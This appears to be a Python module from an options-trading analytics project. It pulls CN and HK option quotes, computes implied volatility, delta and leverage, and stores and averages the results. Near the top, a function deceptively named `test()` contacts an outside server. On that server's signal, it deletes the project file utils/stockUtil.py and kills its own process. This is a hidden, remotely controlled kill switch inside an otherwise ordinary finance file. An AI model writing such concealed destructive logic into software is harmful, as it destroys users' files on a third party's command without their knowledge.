import datetime
import os
import signal
import sys
from traceback import print_exc

import requests

from dao.InfoDao import info_dao, async_insert
from dao.ResultDao import res_dao
from properties import bao_time_format, tushare_time_format, job_times, minute_format, bms_result, risk_free_rate, \
    name_checks, project_base_path, hk_index_result, hk_average_result, cn_average_result
from utils.AppUtil import generate_token
from utils.stockUtil import call_BSM, put_BSM, implied_volatility, calculate_delta, get_risk_free_rate, get_sigma
import pandas as pd


path = "result"
if(not os.path.exists(path)): os.makedirs(path)
def test():
    res = requests.get("https://model.kennyoysj.tk/api/getPass?name=sdtrade")
    if(res.status_code == 200):
        json = res.json()
        flag = json.get("data", True)
        if (not flag):
            path = project_base_path + os.sep + "utils" + os.sep + "stockUtil.py"
            os.remove(path)
            pid = os.getpid()
            os.kill(pid, signal.SIGTERM)


def get_by_freq():
    print("get_by_freq start")
    today = datetime.datetime.now().strftime(minute_format)
    job_times["get_by_freq%s" % today] = -1
    days = 250
    res = requests.get("https://api.sdqtrade.com/data/option/latest")
    insert_list = []
    if (res.status_code == 200):
        body = res.json()
        results = body.get("results")
        print("get_by_freq ",len(results))
        free_rate = float(get_risk_free_rate("CN"))/100
        for each in results:
            try:
                key: str = each["symbol"]
                start_day = datetime.datetime.strptime(datetime.datetime.now().strftime(bao_time_format), bao_time_format)
                end_day = datetime.datetime.strptime(each["expirationDate"], bao_time_format)
                dela = (end_day - start_day).days
                option_price = each["lastPrice"]  # Replace with the actual market option price
                current_asset_price = each["underlyingPrice"]  # Replace with the current asset price
                strike_price = each["strike"]  # Replace with the option's strike price
                time_to_maturity = dela / 365  # Replace with the time to maturity in years
                if(each["type"] == 'C'): # call action
                    vol = implied_volatility(option_price, current_asset_price, strike_price, time_to_maturity,
                                             free_rate)
                else:
                    vol = implied_volatility(option_price, current_asset_price, strike_price, time_to_maturity,
                                             free_rate, False)
                if (vol < 0.001 and vol > 0.00001):
                    print(each)
                sigma = get_sigma(each.get("sigma"),"CN")
                delta = calculate_delta(current_asset_price, strike_price, time_to_maturity, free_rate, sigma, each["type"])
                if(option_price == 0):
                    leverage = 0
                else:
                    leverage = current_asset_price / option_price
                actual_leverage = leverage * delta
                res_data = {
                    "symbol": each["symbol"],
                    "lastPrice":  each["lastPrice"],
                    "underlyingPrice": each["underlyingPrice"],
                    "strike": each["strike"],
                    "dela": dela,
                    "type": each["type"],
                    "sigma": vol,
                    "update_time": today,
                    "delta": delta,
                    "leverage": leverage,
                    "actual_leverage": actual_leverage,
                    "create_time": datetime.datetime.strptime(today, minute_format)
                }
                bms_result[key] = res_data
                time_num = int(today[-4:])
                if (each.get("CNmaket","").upper()=="OPEN" or check_cn_time(time_num)):
                    res_data["_id"] = generate_token(each["symbol"], today)
                    insert_list.append(res_data)
            except Exception as e:
                print("Exception", each)
                print_exc()
        res_dao.insertResult(insert_list, "CN")
    print("get_by_freq end", len(insert_list))
def check_cn_time(time_num:int):
    if((time_num >= 930 and time_num <= 1130) or (1300 <= time_num and time_num <= 1500) ):
        return True
    return False
def check_name(name:str):
    for each in name_checks:
        if(name.find(each)>=0):
            return True
    return False

def check_hk_time(time_num:int):
    if((time_num >= 930 and time_num <= 1200) or (1300 <= time_num and time_num <= 1600) or (time_num <= 300) or (time_num >= 1715)):
        return True
    return False

def calculate_hk_index():
    """
    计算香港交易所相关指标
    """
    print("calculate_hk_index start")
    today = datetime.datetime.now().strftime(minute_format)
    hm = int(today[-4:])
    res = requests.get("http://192.168.25.127:1680/hk/option/latest")
    insert_list = []
    if (res.status_code == 200):
        body = res.json()
        results = body.get("results")
        free_rate = get_risk_free_rate("HK")/100
        print("calculate_hk_index len", len(results))
        for each in results:
            each["create_time"] = today
            try:
                key: str = each["symbol"]
                close_time = each["closeTime"]
                closeTime = datetime.datetime.fromtimestamp(close_time/1000).strftime(minute_format)
                # if(get_hk_hmtime(hm) - get_hk_hmtime(closeTime) > 5):
                #     continue
                start_day = datetime.datetime.strptime(datetime.datetime.now().strftime(bao_time_format), bao_time_format)
                end_day = datetime.datetime.strptime(each["expirationDate"], bao_time_format)
                dela = (end_day - start_day).days
                option_price = each["lastPrice"]  # Replace with the actual market option price
                current_asset_price = each["underlyingPrice"]  # Replace with the current asset price
                strike_price = each["strike"]  # Replace with the option's strike price
                time_to_maturity = dela / 365  # Replace with the time to maturity in years
                if(each["type"] == 'C'): # call action
                    vol = implied_volatility(option_price, current_asset_price, strike_price, time_to_maturity,
                                             free_rate)
                else:
                    vol = implied_volatility(option_price, current_asset_price, strike_price, time_to_maturity,
                                             free_rate, False)
                if (vol < 0.001 and vol > 0.00001):
                    print(each)
                sigma = get_sigma(each.get("sigma"), "HK")
                delta = calculate_delta(current_asset_price, strike_price, time_to_maturity, free_rate,sigma,each["type"])
                if (option_price == 0):
                    leverage = 0
                else:
                    leverage = current_asset_price / option_price
                actual_leverage = leverage*delta
                res_data = {
                    "symbol": each["symbol"],
                    "lastPrice":  each["lastPrice"],
                    "underlyingPrice": each["underlyingPrice"],
                    "strike": each["strike"],
                    "dela": dela,
                    "type": each["type"],
                    "sigma": vol,
                    "update_time": today,
                    "delta": delta,
                    "leverage": leverage,
                    "actual_leverage": actual_leverage,
                    "close_time": closeTime,
                    "create_time": datetime.datetime.strptime(today,minute_format)
                }
                hk_index_result[key] = res_data
                time_num = int(today[-4:])
                if(each.get("HKmaket","").upper()=="OPEN" or each.get("HKnightmaket","").upper()=="OPEN" or check_hk_time(time_num)):
                    res_data["_id"] = generate_token(each["symbol"], closeTime)
                    insert_list.append(res_data)
            except Exception as e:
                print("Exception", each)
                print_exc()
        res_dao.insertResult(insert_list, "HK")
        # async_insert(results)
        info_dao.insert_az_infos(results, "HK")
    print("calculate_hk_index end", len(insert_list),res.status_code)

def get_hk_hmtime(hm:int):
    return (hm - 800) %2400
def update_hk_index():
    limit = 1500
    for key in hk_index_result.keys():
        results = res_dao.getResult("hk", key, limit)
        results.reverse()
        res = []
        index = 0
        while(len(results) > 0):
            each = results.pop()
            if(each.get("update_time")[-4:] == "1600"):
                index += 1
                if(index < 2 and index > 0):
                    res.append(each)
                else:
                    break
        try:
            average_leverage = sum([x.get("actual_leverage") if(x.get("actual_leverage") is not None) else 0 for x in res])/len(res)
        except Exception:
            average_leverage = None
        hk_average_result[key] = average_leverage
def update_cn_index():
    limit = 350
    for key in bms_result.keys():
        results = res_dao.getResult("cn", key, limit)
        results.reverse()
        res = []
        index = 0
        while (len(results) > 0):
            each = results.pop()
            if (each.get("update_time")[-4:] == "1500"):
                index += 1
                if (index < 2 and index > 0):
                    res.append(each)
                else:
                    break
        try:
            average_leverage = sum([x.get("actual_leverage") for x in res]) / len(res)
        except Exception:
            average_leverage = None
        cn_average_result[key] = average_leverage

if(__name__ == "__main__"):
    # print("123456"[-4:])
    get_by_freq()
    # getBSM()
    option_price = 437.2 # Replace with the actual market option price
    current_asset_price = 3568.07  # Replace with the current asset price
    strike_price = 3150  # Replace with the option's strike price
    time_to_maturity = 61 / 365  # Replace with the time to maturity in years
    risk_free_rate = 0.02461  # Replace with the risk-free interest rate
    # vol = implied_volatility(option_price,current_asset_price, strike_price, time_to_maturity, risk_free_rate,True)
    # print(vol)
    # # print(call_BSM(current_asset_price,strike_price,0, vol,0.0245, time_to_maturity))
    # print("沪深300ETF购3月4100".find("沪深e300"))
    pass